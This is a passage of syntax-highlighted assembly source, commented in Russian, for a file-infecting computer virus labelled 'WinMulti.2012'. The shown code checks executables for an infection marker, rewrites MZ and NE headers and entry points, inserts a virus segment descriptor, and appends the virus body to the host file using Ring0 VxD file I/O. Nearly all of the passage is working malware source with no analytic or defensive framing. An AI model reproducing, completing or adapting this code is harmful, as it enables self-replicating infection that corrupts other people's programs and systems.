        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StartMZ</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc0">


</span><span class="sc1">;[Корректируем точку входа и адрес стека]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем признак зараженности]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">6666h</span><span class="sc0">


</span><span class="sc1">;[Записываем вирус в файл]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteVirus1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Записываем новый MZ заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DosHeaderSize</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Проверяем, заражен ли файл]</span><span class="sc0">

</span><span class="sc5">InfectNE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'6666'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Проверяем операционную систему, для которой предназначен файл]</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">36h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Сохраняем стартовый адрес]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReloCSIP</span><span class="sc4">-</span><span class="sc5">EndCode16</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFFF0000h</span><span class="sc0">


</span><span class="sc1">;[Настраиваем Relocation Table]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RelocTable</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">04030001h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RelocTable</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ReloCSIP</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RelocTable</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Увеличиваем смещение всех таблиц на один элемент]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NEObjectSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">26h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeaderOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Увеличиваем количество сегментов и вычисляем новый стартовый адрес]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">StartNE</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем признак зараженности]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'6666'</span><span class="sc0">


</span><span class="sc1">;[Записываем новый указатель на NE-EXE заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeaderOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Записываем новый NE-EXE заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NEHeaderSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeaderOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Вычисляем расположение таблицы сегментов]</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeaderOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Сдвигаем таблицу сегментов назад на один дескриптор]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NEObjectSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Shift</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Shift</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObjectOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">


</span><span class="sc1">;[Вычисляем смещение вируса в файле в блоках]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">32h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Создаем дескриптор вирусного сегмента]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0180h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">


</span><span class="sc1">;[Записываем вирус в конец файла]</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc4">+</span><span class="sc5">RelocTableSize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteVirus2</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Записываем сегмент вируса в таблицу сегментов]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NEObjectSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObjectOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                             ПОДПРОГРАММЫ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Calc</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">WriteVirus1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
</span><span class="sc5">WriteVirus2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Start16</span><span class="sc4">-</span><span class="sc5">EndCode16</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Write</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D601h</span><span class="sc0">     </span><span class="sc1">; R0_WriteFile</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FileIO</span><span class="sc0">
</span><span class="sc5">Read</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D600h</span><span class="sc0">     </span><span class="sc1">; R0_ReadFile</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FileIO</span><span class="sc0">
</span><span class="sc5">GetFSize</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D800h</span><span class="sc0">     </span><span class="sc1">; R0_GetFileSize</span><span class="sc0">
</span><span class="sc5">FileIO</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00400032h</span><span class="sc0">       </span><span class="sc1">; IFSmgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDcall</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">VxDcall</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Int20h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">20CDh</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RetAddr</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDfunc</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Int20h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VxDfunc</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">RetAddr</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                 ДАННЫЕ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">VirName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WinMulti.2012 -- Copyright (c) by DJ Sadovnikov'</span><span class="sc0">

</span><span class="sc5">EndCode32</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">CodeSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">EndCode32</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">)+(</span><span class="sc5">EndCode16</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">RelocTableSize</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">DosHeaderSize</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">WinHeaderSize</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5Ch</span><span class="sc0">     </span><span class="sc1">; MAX(PEHeaderSize,NEHeaderSize)</span><span class="sc0">
</span><span class="sc5">WinObjectSize</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">28h</span><span class="sc0">     </span><span class="sc1">; MAX(PEObjectSize,NEObjectSize)</span><span class="sc0">
</span><span class="sc5">PEHeaderSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5Ch</span><span class="sc0">
</span><span class="sc5">NEHeaderSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">40h</span><span class="sc0">
